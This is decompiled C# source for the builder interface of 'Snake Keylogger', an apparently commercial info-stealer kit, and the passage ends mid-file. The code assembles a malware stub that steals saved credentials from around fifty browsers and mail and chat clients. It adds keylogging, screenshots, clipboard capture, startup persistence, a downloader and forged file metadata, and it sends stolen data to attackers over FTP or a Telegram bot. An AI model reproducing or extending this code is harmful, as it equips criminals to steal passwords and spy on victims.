using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using MetroSuite;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Snake_Keylogger.snakesystem;



namespace Snake_Keylogger
{
	// Token: 0x02000011 RID: 17
	public partial class Form1 : MetroForm
	{
		// Token: 0x0600008B RID: 139 RVA: 0x00006048 File Offset: 0x00004248
		public Form1()
		{
			base.Load +=this.Form1_Load;
			base.Resize +=this.Form1_Resize;
		this.PASSWORD = "YrTVKTaWocPKgCyA - " + new Random().Next().ToString();
		this.T = new Random();
		this.RecoverMethodType = "";
		this.Getter = "";
		this.InitializeComponent();
		}

		// Token: 0x0600008C RID: 140 RVA: 0x000060D4 File Offset: 0x000042D4
		public string GetRandomString(int iLength)
		{
			string text = "";
			Random random = new Random();
			checked
			{
				for (int i = 1; i <= iLength; i++)
				{
					text += Conversions.ToString(Strings.ChrW(random.Next(0x20, 0x7E)));
				}
				return text;
			}
		}

		// Token: 0x0600008D RID: 141 RVA: 0x0000612C File Offset: 0x0000432C
		public object RandomStringa()
		{
			string text = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
			Random random = new Random();
			StringBuilder stringBuilder = new StringBuilder();
			int num = 1;
			checked
			{
				do
				{
					int num2 = random.Next(0, 0x23);
					stringBuilder.Append(text.Substring(num2, 1));
					num++;
				}
				while (num <= 8);
				return stringBuilder.ToString();
			}
		}

		// Token: 0x0600008E RID: 142 RVA: 0x00006188 File Offset: 0x00004388
		public string RandomString()
		{
			string text = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
			string text2 = text;
			StringBuilder stringBuilder = new StringBuilder();
			int num = Convert.ToInt32(this.sizepumpernum.Value);
			checked
			{
				for (int i = 1; i <= num; i++)
				{
					int num2 =this.T.Next(0, 0xB1);
					stringBuilder.Append(text2.Substring(num2, 1));
				}
				return stringBuilder.ToString();
			}
		}

		// Token: 0x0600008F RID: 143 RVA: 0x00006200 File Offset: 0x00004400
		public object RandomGeneratorumber()
		{
			VBMath.Randomize();
			float num = Conversion.Int(-230f * VBMath.Rnd()) + 260f;
			return num;
		}

		// Token: 0x06000090 RID: 144 RVA: 0x00006238 File Offset: 0x00004438
		public object RandomGenerator()
		{
			VBMath.Randomize();
			float num = Conversion.Int(9f * VBMath.Rnd()) + 1f;
			return num;
		}

		// Token: 0x06000091 RID: 145 RVA: 0x00006270 File Offset: 0x00004470
		public byte[] RC4Encrypt(byte[] A6, string A7)
		{
			byte[] bytes = Encoding.BigEndianUnicode.GetBytes(A7);
			uint[] array = new uint[0x100];
			checked
			{
				byte[] array2 = new byte[A6.Length - 1 + 1 - 1 + 1];
				uint num = 0U;
				uint num2;
				uint num3;
				do
				{
					array[(int)num] = num;
					num += 1U;
					num2 = num;
					num3 = 0xFFU;
				}
				while (num2 <= num3);
				num = 0U;
				uint num4 = 0;
				uint num6 = 0;
				do
				{
					num4 = (uint)(unchecked((ulong)(checked(num4 + (uint)bytes[(int)(unchecked((ulong)num) % (ulong)(unchecked((long)bytes.Length)))] + array[(int)num]))) & 0xFFUL);
					uint num5 = array[(int)num];
					array[(int)num] = array[(int)num4];
					array[(int)num4] = num5;
					num += 1U;
					num6 = num;
					num3 = 0xFFU;
				}
				while (num6 <= num3);
				num = 0U;
				num4 = 0U;
				int num7 = 0;
				int num8 = array2.Length - 1;
				int num9 = num7;
				for (;;)
				{
					int num10 = num9;
					int num11 = num8;
					bool flag = num10 > num11;
					if (flag)
					{
						break;
					}
					num = (uint)((unchecked((ulong)num) + 1UL) & 0xFFUL);
					num4 = (uint)(unchecked((ulong)(checked(num4 + array[(int)num]))) & 0xFFUL);
					uint num12 = array[(int)num];
					array[(int)num] = array[(int)num4];
					array[(int)num4] = num12;
					array2[num9] = (byte)((uint)A6[num9] ^ array[(int)(unchecked((ulong)(checked(array[(int)num] + array[(int)num4]))) & 0xFFUL)]);
					num9++;
				}
				return array2;
			}
		}

		// Token: 0x06000092 RID: 146 RVA: 0x000063E0 File Offset: 0x000045E0
		public byte[] XOREncrypt(byte[] up, string BB2)
		{
			byte[] bytes = Encoding.BigEndianUnicode.GetBytes(BB2);
			VBMath.Randomize();
			checked
			{
				int num = (int)Math.Round(Math.Round((double)(unchecked(Conversion.Int(256f * VBMath.Rnd()) + 1f))));
				byte[] array = new byte[up.Length + 1 - 1 + 1];
				int num2 = 0;
				int num3 = up.Length - 1;
				int num4 = num2;
				for (;;)
				{
					int num5 = num4;
					int num6 = num3;
					bool flag = num5 > num6;
					if (flag)
					{
						break;
					}
					byte[] array2 = array;
					byte[] array3 = array2;
					int num7 = num4;
					int num8 = 0;
					array3[num7] = (byte)((int)array2[num7] + ((int)(up[num4] ^ bytes[num8]) ^ num));
					bool flag2 = num8 == BB2.Length - 1;
					bool flag3 = flag2;
					if (flag3)
					{
						num8 = 0;
					}
					else
					{
						num8++;
					}
					num4++;
				}
				array[up.Length] = (byte)(0x70 ^ num);
				return array;
			}
		}

		// Token: 0x06000093 RID: 147 RVA: 0x000064D0 File Offset: 0x000046D0
		public string Decrypt(string cipherText)
		{
			string text = "kamskams";
			string text2 = "kwkwkwkwkwkwkwkw";
			int num = 2;
			string text3 = "@1B2c3DEWE4e5F6g7H8";
			int num2 = 0x100;
			byte[] bytes = Encoding.ASCII.GetBytes(text3);
			byte[] bytes2 = Encoding.ASCII.GetBytes(text2);
			byte[] array = Convert.FromBase64String(cipherText);
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(text, bytes2, num);
			byte[] bytes3 = rfc2898DeriveBytes.GetBytes(num2 / 8);
			ICryptoTransform cryptoTransform = new RijndaelManaged
			{
				Mode = CipherMode.CBC
			}.CreateDecryptor(bytes3, bytes);
			MemoryStream memoryStream = new MemoryStream(array);
			CryptoStream cryptoStream = new CryptoStream(memoryStream, cryptoTransform, CryptoStreamMode.Read);
			byte[] array2 = new byte[checked(array.Length - 1 + 1)];
			int num3 = cryptoStream.Read(array2, 0, array2.Length);
			memoryStream.Close();
			cryptoStream.Close();
			return Encoding.UTF8.GetString(array2, 0, num3);
		}

		// Token: 0x06000094 RID: 148 RVA: 0x000065C0 File Offset: 0x000047C0
		public string Encrypt(string plainText)
		{
			string text = "kamskams";
			string text2 = "kwkwkwkwkwkwkwkw";
			int num = 2;
			string text3 = "@1B2c3DEWE4e5F6g7H8";
			int num2 = 0x100;
			byte[] bytes = Encoding.ASCII.GetBytes(text3);
			byte[] bytes2 = Encoding.ASCII.GetBytes(text2);
			byte[] bytes3 = Encoding.UTF8.GetBytes(plainText);
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(text, bytes2, num);
			byte[] bytes4 = rfc2898DeriveBytes.GetBytes(num2 / 8);
			ICryptoTransform cryptoTransform = new RijndaelManaged
			{
				Mode = CipherMode.CBC
			}.CreateEncryptor(bytes4, bytes);
			MemoryStream memoryStream = new MemoryStream();
			CryptoStream cryptoStream = new CryptoStream(memoryStream, cryptoTransform, CryptoStreamMode.Write);
			cryptoStream.Write(bytes3, 0, bytes3.Length);
			cryptoStream.FlushFinalBlock();
			byte[] array = memoryStream.ToArray();
			memoryStream.Close();
			cryptoStream.Close();
			return Convert.ToBase64String(array);
		}

		// Token: 0x06000095 RID: 149 RVA: 0x000066AC File Offset: 0x000048AC
		public static byte[] enxrypt(byte[] bytData, string sKey, CipherMode tMode = CipherMode.ECB, PaddingMode tPadding = PaddingMode.PKCS7)
		{
			MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
			byte[] array = md5CryptoServiceProvider.ComputeHash(Encoding.UTF8.GetBytes(sKey));
			md5CryptoServiceProvider.Clear();
			TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
			tripleDESCryptoServiceProvider.Key = array;
			tripleDESCryptoServiceProvider.Mode = tMode;
			tripleDESCryptoServiceProvider.Padding = tPadding;
			ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateEncryptor();
			byte[] array2 = cryptoTransform.TransformFinalBlock(bytData, 0, bytData.Length);
			tripleDESCryptoServiceProvider.Clear();
			return array2;
		}

		// Token: 0x06000096 RID: 150 RVA: 0x00006720 File Offset: 0x00004920
		public string zara(string input)
		{
			StringBuilder stringBuilder = new StringBuilder();
			int i = 0;
			int length = input.Length;
			checked
			{
				while (i < length)
				{
					char c = input[i];
					stringBuilder.Append((Strings.Asc(c) + 0x138).ToString() + " ");
					i++;
				}
				return stringBuilder.ToString().Substring(0, stringBuilder.Length - 1);
			}
		}

		// Token: 0x06000097 RID: 151 RVA: 0x000067A4 File Offset: 0x000049A4
		public static byte[] GZip(byte[] byte_0)
		{
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using (GZipStream gzipStream = new GZipStream(memoryStream, CompressionMode.Compress))
				{
					gzipStream.Write(byte_0, 0, byte_0.Length);
					gzipStream.Close();
					byte_0 = new byte[checked(memoryStream.ToArray().Length - 1 + 1 - 1 + 1 - 1 - 1 + 1)];
					byte_0 = memoryStream.ToArray();
				}
				memoryStream.Close();
			}
			return byte_0;
		}

		// Token: 0x06000098 RID: 152 RVA: 0x0000685C File Offset: 0x00004A5C
		public string random(int Lenght, string CustomCharacters = "FהоWהرY吉خiRرウ开XъدcOбDWحUATה弗هזجbUזоזدOجиUیZجعUPشYהвلcYىトهFWcMخخiRحPزAه\u200cNдコNWWTתFeجZDPLظW吉عهהSоVUiRъفلQ弗הعTFזفдQウRQXPдеشFحSKNASVFQدOFזءA吉DזеةاiLOеAebcFحコYдا私gLהトوAдدQKزזحбLخظةZウیWفخعUءKcءیJهトウתظهزъءSوQcזKת开AウbFMروZو开ۆXVحNМههiوתحKزתلUY开ъXJKPcUコرоرجXOSUNMъז吉Nخء开gJеcתбPתخNъ开NFهTجKFМAVعدرвXدזHOHHPJدתJSشTLYعקоخgトVدcהDZהHбYKJXbהZVRزدىеウدLKOوAciعRJTLفתDخ弗הNفi\u200cةJعвZiعъ私اOKDTK吉HHPiدNهLNМOicLNد\u200cъNeVYءAAウהYW")
		{
			VBMath.Randomize();
			StringBuilder stringBuilder = new StringBuilder();
			StringBuilder stringBuilder2 = stringBuilder;
			checked
			{
				for (int i = 1; i <= Lenght; i++)
				{
					VBMath.Randomize();
					int num = (int)Math.Round((double)(unchecked(Conversion.Int((float)(checked(CustomCharacters.ToCharArray().Length - 2 - 0 + 1)) * VBMath.Rnd()) + 1f)));
					stringBuilder2.Append(CustomCharacters[num]);
				}
				return stringBuilder2.ToString();
			}
		}

		// Token: 0x06000099 RID: 153 RVA: 0x000068DC File Offset: 0x00004ADC
		private void Display_Description(string Name, string comversion)
		{
			try
			{
				Application.DoEvents();
				bool flag = File.Exists(Application.StartupPath + "\\res.exe");
				if (flag)
				{
					File.Delete(Application.StartupPath + "\\res.exe");
				}
				Thread.Sleep(0xA);
				File.WriteAllBytes(Application.StartupPath + "\\res.exe", Properties.Resources.Res);
				Thread.Sleep(0xA);
                string text = Properties.Resources.AssemblyReverser;
				VBCodeProvider vbcodeProvider = new VBCodeProvider(new Dictionary<string, string> { { "CompilerVersion", comversion } });
				CompilerParameters compilerParameters = new CompilerParameters();
				CompilerParameters compilerParameters2 = compilerParameters;
				compilerParameters2.GenerateExecutable = true;
				compilerParameters2.OutputAssembly = Application.StartupPath + "\\" +this.T1.Text + ".exe";
				compilerParameters2.CompilerOptions = "/target:winexe";
				compilerParameters2.ReferencedAssemblies.Add("System.dll");
				compilerParameters2.ReferencedAssemblies.Add("dll");
				compilerParameters2.MainClass = "X";
				text = text.Replace("*Title*",this.T1.Text);
				text = text.Replace("*Description*",this.T2.Text);
				text = text.Replace("*Company*",this.T3.Text);
				text = text.Replace("*Product*",this.T4.Text);
				text = text.Replace("*Copyright*",this.T5.Text);
				text = text.Replace("*version*", string.Concat(new string[]
				{
				this.N1.Value.ToString(),
					".",
				this.N2.Value.ToString(),
					".",
				this.N3.Value.ToString(),
					".",
				this.N4.Value.ToString()
				}));
				CompilerResults compilerResults = vbcodeProvider.CompileAssemblyFromSource(compilerParameters, new string[] { text });
				string text2 = Application.StartupPath + "\\" +this.T1.Text + ".exe";
				string text3 = Application.StartupPath + "\\" +this.T1.Text + ".res";
				Interaction.Shell(string.Concat(new string[] { "res.exe -extract ", text2, ",", text3, ",VERSIONINFO,," }), AppWinStyle.Hide, true, -1);
				Interaction.Shell(string.Concat(new string[]
				{
					"res.exe -delete ",
					Name,
					",",
					AppDomain.CurrentDomain.BaseDirectory,
					"res.exe,VERSIONINFO,,"
				}), AppWinStyle.Hide, true, -1);
				Interaction.Shell(string.Concat(new string[] { "res.exe -addoverwrite ", Name, ",", Name, ",", text3, ",VERSIONINFO,1," }), AppWinStyle.Hide, true, -1);
				Interaction.Shell("res.exe -delete " + Name + ",VERSIONINFO,,", AppWinStyle.Hide, true, -1);
				Thread.Sleep(0x7D0);
				if (File.Exists(Application.StartupPath + "\\" +this.T1.Text + ".exe")) { File.Delete(Application.StartupPath + "\\" +this.T1.Text + ".exe"); }
				if (File.Exists(Application.StartupPath + "\\" +this.T1.Text + ".res")) { File.Delete(Application.StartupPath + "\\" +this.T1.Text + ".res"); }
				if (File.Exists(Application.StartupPath + "\\res.exe")) { File.Delete(Application.StartupPath + "\\res.exe"); }
				if (File.Exists(Application.StartupPath + "\\res.log")) { File.Delete(Application.StartupPath + "\\res.log"); }
				if (File.Exists(Application.StartupPath + "\\res.ini")) { File.Delete(Application.StartupPath + "\\res.ini"); }
			}
			catch { Interaction.MsgBox("Error : A Mistake In Changing Server Description", MsgBoxStyle.Critical, "Information"); }
		}

		// Token: 0x0600009A RID: 154 RVA: 0x00006E1C File Offset: 0x0000501C
		private void AddRecoveries()
		{
			string text = Properties.Resources.StubOne;
			bool @checked =this.chromec.Checked;
			if (@checked)
			{
				text = text.Replace("'$&Chrome&$", null);
			}
			bool checked2 =this.filezillac.Checked;
			if (checked2)
			{
				text = text.Replace("'$&filezilla&$", null);
			}
			bool checked3 =this.operac.Checked;
			if (checked3)
			{
				text = text.Replace("'$&opera&$", null);
			}
			bool checked4 =this.firefoxc.Checked;
			if (checked4)
			{
				text = text.Replace("'$&firefox&$", null);
			}
			bool checked5 =this.epicc.Checked;
			if (checked5)
			{
				text = text.Replace("'$&epic&$", null);
			}
			bool checked6 =this.blisk.Checked;
			if (checked6)
			{
				text = text.Replace("'$&blisk&$", null);
			}
			bool checked7 =this.ucc.Checked;
			if (checked7)
			{
				text = text.Replace("'$&uc&$", null);
			}
			bool checked8 =this.torchc.Checked;
			if (checked8)
			{
				text = text.Replace("'$&torch&$", null);
			}
			bool checked9 =this.brave.Checked;
			if (checked9)
			{
				text = text.Replace("'$&brave&$", null);
			}
			bool checked10 =this.outlookc.Checked;
			if (checked10)
			{
				text = text.Replace("'$&Outlook&$", null);
			}
			bool checked11 =this.foxmailc.Checked;
			if (checked11)
			{
				text = text.Replace("'$&Foxmail&$", null);
			}
			bool checked12 =this.thunderbirdc.Checked;
			if (checked12)
			{
				text = text.Replace("'$&thunderbird&$", null);
			}
			bool checked13 =this.qqc.Checked;
			if (checked13)
			{
				text = text.Replace("'$&QQ&$", null);
			}
			bool checked14 =this.orbitumc.Checked;
			if (checked14)
			{
				text = text.Replace("'$&orbitum&$", null);
			}
			bool checked15 =this.irudiumc.Checked;
			if (checked15)
			{
				text = text.Replace("'$&iridum&$", null);
			}
			bool checked16 =this.Slimjetc.Checked;
			if (checked16)
			{
				text = text.Replace("'$&slimjet&$", null);
			}
			bool checked17 =this.vivaldic.Checked;
			if (checked17)
			{
				text = text.Replace("'$&vivaldi&$", null);
			}
			bool checked18 =this.ironc.Checked;
			if (checked18)
			{
				text = text.Replace("'$&iron&$", null);
			}
			bool checked19 =this.Ghostc.Checked;
			if (checked19)
			{
				text = text.Replace("'$&ghost&$", null);
			}
			bool checked20 =this.centc.Checked;
			if (checked20)
			{
				text = text.Replace("'$&cent&$", null);
			}
			bool checked21 =this.xvastc.Checked;
			if (checked21)
			{
				text = text.Replace("'$&xVast&$", null);
			}
			bool checked22 =this.superbirdc.Checked;
			if (checked22)
			{
				text = text.Replace("'$&Superbird&$", null);
			}
			bool checked23 =this.coccocc.Checked;
			if (checked23)
			{
				text = text.Replace("'$&CocCoc&$", null);
			}
			bool checked24 =this.seamonkeyc.Checked;
			if (checked24)
			{
				text = text.Replace("'$&seamonkey&$", null);
			}
			bool checked25 =this.sic.Checked;
			if (checked25)
			{
				text = text.Replace("'$&360English&$", null).Replace("'$&360China&$", null);
			}
			bool checked26 =this.comodoc.Checked;
			if (checked26)
			{
				text = text.Replace("'$&comodo&$", null);
			}
			bool checked27 =this.icedragonc.Checked;
			if (checked27)
			{
				text = text.Replace("'$&icedragon&$", null);
			}
			bool checked28 =this.cyberfoxc.Checked;
			if (checked28)
			{
				text = text.Replace("'$&cyberfox&$", null);
			}
			bool checked29 =this.chromeiumc.Checked;
			if (checked29)
			{
				text = text.Replace("'$&chromium&$", null);
			}
			bool checked30 =this.palemoonc.Checked;
			if (checked30)
			{
				text = text.Replace("'$&palemoon&$", null);
			}
			bool checked31 =this.chedotc.Checked;
			if (checked31)
			{
				text = text.Replace("'$&Chedot&$", null);
			}
			bool checked32 =this.lieboac.Checked;
			if (checked32)
			{
				text = text.Replace("'$&liebao&$", null);
			}
			bool checked33 =this.pidginc.Checked;
			if (checked33)
			{
				text = text.Replace("'$&pidgin&$", null);
			}
			bool checked34 =this.avastc.Checked;
			if (checked34)
			{
				text = text.Replace("'$&avast&$", null);
			}
			bool checked35 =this.amigo.Checked;
			if (checked35)
			{
				text = text.Replace("'$&Amigo&$", null);
			}
			bool checked36 =this.xpomc.Checked;
			if (checked36)
			{
				text = text.Replace("'$&Xpom&$", null);
			}
			bool checked37 =this.kometac.Checked;
			if (checked37)
			{
				text = text.Replace("'$&Kometa&$", null);
			}
			bool checked38 =this.nichromec.Checked;
			if (checked38)
			{
				text = text.Replace("'$&Nichrome&$", null);
			}
			bool checked39 =this.waterfoxc.Checked;
			if (checked39)
			{
				text = text.Replace("'$&WaterFox&$", null);
			}
			bool checked40 =this.kinzac.Checked;
			if (checked40)
			{
				text = text.Replace("'$&Kinzaa&$", null);
			}
			bool checked41 =this.sputnikc.Checked;
			if (checked41)
			{
				text = text.Replace("'$&Sputnik&$", null);
			}
			bool checked42 =this.falkonc.Checked;
			if (checked42)
			{
				text = text.Replace("'$&Falkon&$", null);
			}
			bool checked43 =this.postboxc.Checked;
			if (checked43)
			{
				text = text.Replace("'$&PostBox&$", null);
			}
			bool checked44 =this.blackhawkc.Checked;
			if (checked44)
			{
				text = text.Replace("'$&BlackHawk&$", null);
			}
			bool checked45 =this.citrioc.Checked;
			if (checked45)
			{
				text = text.Replace("'$&Citrio&$", null);
			}
			bool checked46 =this.uranc.Checked;
			if (checked46)
			{
				text = text.Replace("'$&Uran&$", null);
			}
			bool checked47 =this.coowonc.Checked;
			if (checked47)
			{
				text = text.Replace("'$&Coowon&$", null);
			}
			bool checked48 =this.startc.Checked;
			if (checked48)
			{
				text = text.Replace("'$&7Star&$", null);
			}
			bool checked49 =this.qipsurfc.Checked;
			if (checked49)
			{
				text = text.Replace("'$&QIPSurf&$", null);
			}
			bool checked50 =this.sleipnirc.Checked;
			if (checked50)
			{
				text = text.Replace("'$&Sleipnir&$", null);
			}
			bool checked51 =this.canaryc.Checked;
			if (checked51)
			{
				text = text.Replace("'$&ChromeCanary&$", null);
			}
			bool checked52 =this.coolnovoc.Checked;
			if (checked52)
			{
				text = text.Replace("'$&CoolNovo&$", null);
			}
			bool checked53 =this.icedragonc.Checked;
			if (checked53)
			{
				text = text.Replace("'$&IceCat&$", null);
			}
			bool checked54 =this.slimc.Checked;
			if (checked54)
			{
				text = text.Replace("'$&TheSlimRecovery&$", null);
			}
		}

		// Token: 0x0600009B RID: 155 RVA: 0x00007608 File Offset: 0x00005808
		public void FtpUploadFile()
		{
            
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), Conversions.ToString(Operators.AddObject(this.PASSWORD, ".txt")));
			StreamWriter streamWriter = new StreamWriter(text);
			streamWriter.WriteLine("Snake Keylogger - Test Successfully.");
			streamWriter.Close();
			StreamReader streamReader = new StreamReader(text);
			byte[] bytes = Encoding.UTF8.GetBytes(streamReader.ReadToEnd());
			streamReader.Close();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)NewLateBinding.LateGet(null, typeof(WebRequest), "Create", new object[] { Operators.AddObject(Operators.AddObject(this.ftpurltxt.Text + "Snake Keylogger - ",this.PASSWORD), ".txt") }, null, null, null);
			try
			{
				ftpWebRequest.Method = "STOR";
				ftpWebRequest.Credentials = new NetworkCredential(this.ftpusertxt.Text,this.ftppasstxt.Text);
				byte[] array = File.ReadAllBytes(text);
				ftpWebRequest.ContentLength = (long)array.Length;
				using (Stream requestStream = ftpWebRequest.GetRequestStream())
				{
					requestStream.Write(array, 0, array.Length);
					requestStream.Close();
					File.Delete(text);
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show("Test Failed, " + ex.Message);
				return;
			}
			Interaction.MsgBox("Test Successfully.", MsgBoxStyle.OkOnly, null);
		}

		// Token: 0x0600009C RID: 156 RVA: 0x000077D0 File Offset: 0x000059D0
		public void telegramsender(string tokennns, string urrid, string msg)
		{
			try
			{
				string text = string.Concat(new string[] { "https://api.telegram.org/bot", tokennns, "/sendMessage?chat_id=", urrid, "&text=", msg });
				ServicePointManager.Expect100Continue = false;
                ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
				HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(text);
				string text2 = string.Empty;
				try
				{
					WebResponse response = httpWebRequest.GetResponse();
					using (Stream responseStream = response.GetResponseStream())
					{
						StreamReader streamReader = new StreamReader(responseStream, Encoding.UTF8);
						streamReader.ReadToEnd();
					}
				}
				catch (WebException ex)
				{
					text2 = ex.Message.ToString();
					Interaction.MsgBox(Information.Err(), MsgBoxStyle.OkOnly, null);
					WebResponse response2 = ex.Response;
					using (Stream responseStream2 = response2.GetResponseStream())
					{
						StreamReader streamReader2 = new StreamReader(responseStream2, Encoding.GetEncoding("utf-8"));
						string text3 = streamReader2.ReadToEnd();
					}
					throw;
				}
			}
			catch { }
		}

		// Token: 0x0600009D RID: 157 RVA: 0x0000797C File Offset: 0x00005B7C
		public static void Compilers(string Output, string cSource)
		{
			VBCodeProvider vbcodeProvider = new VBCodeProvider();
			CompilerParameters compilerParameters = new CompilerParameters();
			compilerParameters.GenerateExecutable = true;
			compilerParameters.OutputAssembly = Output;
			compilerParameters.ReferencedAssemblies.Add("System.dll");
			compilerParameters.ReferencedAssemblies.Add("System.Data.dll");
			compilerParameters.ReferencedAssemblies.Add("dll");
			compilerParameters.ReferencedAssemblies.Add("Microsoft.VisualBasic.dll");
			compilerParameters.ReferencedAssemblies.Add("System.Xml.dll");
			compilerParameters.ReferencedAssemblies.Add("System.Drawing.dll");
			compilerParameters.ReferencedAssemblies.Add("System.Reflection.dll");
			compilerParameters.ReferencedAssemblies.Add("System.Runtime.InteropServices.dll");
			compilerParameters.ReferencedAssemblies.Add("System.IO.dll");
			compilerParameters.ReferencedAssemblies.Add("System.Security.dll");
			compilerParameters.ReferencedAssemblies.Add("System.Web.Extensions.dll");
			compilerParameters.ReferencedAssemblies.Add("System.Management.dll");
			MetroTextbox metroTextbox;
			(metroTextbox = CodeVest.mainForm.buildprocesstxt).Text = metroTextbox.Text + "\r\n\r\nChecking Featuresthis..";
			compilerParameters.CompilerOptions = "/platform:X86  /target:winexe /nowarn";
			compilerParameters.IncludeDebugInformation = false;
			(metroTextbox = CodeVest.mainForm.buildprocesstxt).Text = metroTextbox.Text + "\r\n\r\nChecking for Problemsthis..";
			CompilerResults compilerResults = vbcodeProvider.CompileAssemblyFromSource(compilerParameters, new string[] { cSource });
			bool flag = compilerResults.Errors.Count > 0;
			if (flag)
			{
				try
				{
					foreach (object obj in compilerResults.Errors)
					{
						object objectValue = RuntimeHelpers.GetObjectValue(obj);
						MessageBox.Show(Conversions.ToString(Operators.ConcatenateObject("ERROR: ", NewLateBinding.LateGet(objectValue, null, "errorText", new object[0], null, null, null))), "", MessageBoxButtons.OK, MessageBoxIcon.Hand);
						(metroTextbox = CodeVest.mainForm.buildprocesstxt).Text = Conversions.ToString(Operators.AddObject(metroTextbox.Text, Operators.ConcatenateObject("\r\nError: ", NewLateBinding.LateGet(objectValue, null, "errorText", new object[0], null, null, null))));
					}
				}
				finally
				{
				}
			}
			else
			{
				bool flag2 = compilerResults.Errors.Count == 0;
				if (flag2)
				{
					(metroTextbox = CodeVest.mainForm.buildprocesstxt).Text = metroTextbox.Text + "\r\n\r\nFile Built.";
				}
			}
		}

		// Token: 0x0600009E RID: 158 RVA: 0x00002378 File Offset: 0x00000578
		private void Form1_Load(object sender, EventArgs e)
		{
		this.buildprocesstxt.Text = Properties.Resources.N;
		}

		// Token: 0x0600009F RID: 159 RVA: 0x00002331 File Offset: 0x00000531
		private void MetroTextbox2_TextChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x060000A0 RID: 160 RVA: 0x00007C4C File Offset: 0x00005E4C
		private void sizepumperc_CheckedChanged(object sender, bool isChecked) { this.sizepumpercombo.Enabled = this.sizepumpernum.Enabled = this.sizepumperc.Checked; }

		// Token: 0x060000A1 RID: 161 RVA: 0x00007CA8 File Offset: 0x00005EA8
		private void delayc_CheckedChanged(object sender, bool isChecked)
		{
            this.delaynum.Enabled = this.delayc.Checked;
		}

		// Token: 0x060000A2 RID: 162 RVA: 0x00007CEC File Offset: 0x00005EEC
		private void downloaderc_CheckedChanged(object sender, bool isChecked)
		{
            this.downloadernametxt.Enabled = this.downloaderurltxt.Enabled = this.downloaderc.Checked;
		}

		// Token: 0x060000A3 RID: 163 RVA: 0x00007D48 File Offset: 0x00005F48
		private void digitialsignc_CheckedChanged(object sender, bool isChecked)
		{
            this.digitaltxt.Enabled = this.selectdigitalbtn.Enabled = this.digitialsignc.Checked;
		}

		// Token: 0x060000A4 RID: 164 RVA: 0x00007DA4 File Offset: 0x00005FA4
		private void startupc_CheckedChanged(object sender, bool isChecked)
		{
            this.startupnametxt.Enabled = this.copystartupc.Enabled = this.startupc.Checked;
		}

		// Token: 0x060000A5 RID: 165 RVA: 0x00007E10 File Offset: 0x00006010
		private void copystartupc_CheckedChanged(object sender, bool isChecked)
		{
            this.copystartupcombo.Enabled = this.copystartupc.Checked;
		}

		// Token: 0x060000A6 RID: 166 RVA: 0x00007E54 File Offset: 0x00006054
		private void processkillerc_CheckedChanged(object sender, bool isChecked)
		{
            this.processkillertxt.Enabled = this.processkillerc.Checked;
		}

		// Token: 0x060000A7 RID: 167 RVA: 0x00007E98 File Offset: 0x00006098
		private void openwebc_CheckedChanged(object sender, bool isChecked)
		{
            this.openwebtxt.Enabled = this.openwebc.Checked;
		}

		// Token: 0x060000A8 RID: 168 RVA: 0x00007EDC File Offset: 0x000060DC
		private void addiconc_CheckedChanged(object sender, bool isChecked)
		{
            this.addiconbtn.Enabled = this.addicontxt.Enabled = this.addiconc.Checked;
		}

		// Token: 0x060000A9 RID: 169 RVA: 0x00007F38 File Offset: 0x00006138
		private void clipboardc_CheckedChanged(object sender, bool isChecked)
		{
            this.clipnum.Visible = this.clipboardc.Checked;
		}

		// Token: 0x060000AA RID: 170 RVA: 0x00007F7C File Offset: 0x0000617C
		private void keypadc_CheckedChanged(object sender, bool isChecked) { this.keypadnum.Visible = this.keypadc.Checked; }

		// Token: 0x060000AB RID: 171 RVA: 0x00007FC0 File Offset: 0x000061C0
		private void screenshotc_CheckedChanged(object sender, bool isChecked) { this.screennum.Visible = this.screenshotc.Checked; }

		// Token: 0x060000AC RID: 172 RVA: 0x00008004 File Offset: 0x00006204
		private void assemblyc_CheckedChanged(object sender, bool isChecked)
		{
            N4.Enabled = N3.Enabled = N2.Enabled = N1.Enabled = T5.Enabled = T4.Enabled = T3.Enabled = T2.Enabled =this.T1.Enabled =this.assemblyc.Checked;
		}

		// Token: 0x060000AD RID: 173 RVA: 0x00008118 File Offset: 0x00006318
		private void messageboxc_CheckedChanged(object sender, bool isChecked) {this.msgbtn.Enabled =this.msgcombo.Enabled =this.msgbodytxt.Enabled =this.Titletxt.Enabled =this.messageboxc.Checked; }

		// Token: 0x060000AE RID: 174 RVA: 0x00002331 File Offset: 0x00000531
		private void MetroButton14_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060000AF RID: 175 RVA: 0x0000238C File Offset: 0x0000058C
		private void MetroButton13_Click(object sender, EventArgs e) { Process.Start("https://discord.gg/CcVZTka8u6"); }

		// Token: 0x060000B0 RID: 176 RVA: 0x0000239C File Offset: 0x0000059C
		private void MetroButton12_Click(object sender, EventArgs e) { Process.Start("snakekeylogger.store"); }

		// Token: 0x060000B1 RID: 177 RVA: 0x000081A8 File Offset: 0x000063A8
